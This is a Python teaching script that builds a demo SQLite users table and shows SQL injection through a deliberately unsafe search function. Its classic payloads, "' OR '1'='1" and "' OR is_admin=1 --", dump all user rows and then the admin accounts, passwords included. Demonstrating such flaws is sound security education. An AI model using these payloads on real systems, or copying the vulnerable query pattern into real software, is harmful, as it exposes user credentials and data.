"""
Example of SQL injection vulnerability using the sql_utils library
"""
import sys
import os

# Add the lib directory to the path so we can import sql_utils
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from lib.sql_utils import connect_to_db, search_records_unsafe

def setup_demo_database(db_path: str):
    """Set up a demo database with a users table"""
    conn = connect_to_db(db_path)
    cursor = conn.cursor()
    
    # Create a users table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        name TEXT NOT NULL,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        is_admin BOOLEAN DEFAULT 0
    )
    ''')
    
    # Insert some demo data
    cursor.execute('''
    INSERT OR IGNORE INTO users (id, name, email, password, is_admin)
    VALUES 
        (1, 'Admin User', 'admin@example.com', 'secure_password_hash', 1),
        (2, 'John Smith', 'john@example.com', 'password123', 0),
        (3, 'Jane Doe', 'jane@example.com', 'jane_password', 0)
    ''')
    
    conn.commit()
    return conn

def vulnerable_search_example():
    """Demonstrate SQL injection vulnerability"""
    # Create an in-memory database for the demo
    db_conn = setup_demo_database(":memory:")
    
    print("=== SQL Injection Vulnerability Demo ===\n")
    
    # Normal search that works as expected
    print("Normal search for 'John':")
    results = search_records_unsafe(db_conn, "users", "John")
    for user in results:
        print(f"  - {user['name']} ({user['email']})")
    
    print("\n=== Now demonstrating SQL Injection ===")
    
    # SQL Injection: Using the quotation mark to break out of the string literal
    # and add a condition that's always true
    malicious_input = "' OR '1'='1"
    print(f"\nSearch with malicious input: {malicious_input}")
    results = search_records_unsafe(db_conn, "users", malicious_input)
    
    print("\nAll user records exposed through SQL injection:")
    for user in results:
        print(f"  - ID: {user['id']} | {user['name']} | {user['email']} | Password: {user['password']} | Admin: {user['is_admin']}")
    
    # Another example: extracting the admin user
    malicious_input2 = "' OR is_admin=1 --"
    print(f"\nSearch with another malicious input: {malicious_input2}")
    results = search_records_unsafe(db_conn, "users", malicious_input2)
    
    print("\nExposed admin accounts:")
    for user in results:
        print(f"  - ID: {user['id']} | {user['name']} | {user['email']} | Password: {user['password']} | Admin: {user['is_admin']}")
    
    db_conn.close()

if __name__ == "__main__":
    vulnerable_search_example()
